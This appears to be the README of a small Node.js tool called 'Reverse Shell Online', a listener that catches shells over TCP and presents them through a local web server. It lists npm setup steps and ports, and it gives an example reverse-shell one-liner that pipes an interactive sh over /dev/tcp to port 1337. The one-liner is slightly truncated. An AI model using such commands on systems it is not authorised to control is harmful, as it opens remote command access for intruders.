# Reverse Shell Online

Install dependendies: ```npm i```
Start project with ```npm start```

ENV Vars:
PORT_HTTP=3000
PORT_TCP=1337

Access HTTP server: ```http://localhost:3000```

Example command to spawn a shell:

```sh -i >& /dev/tcp/127.0.0.1/1337 0>&```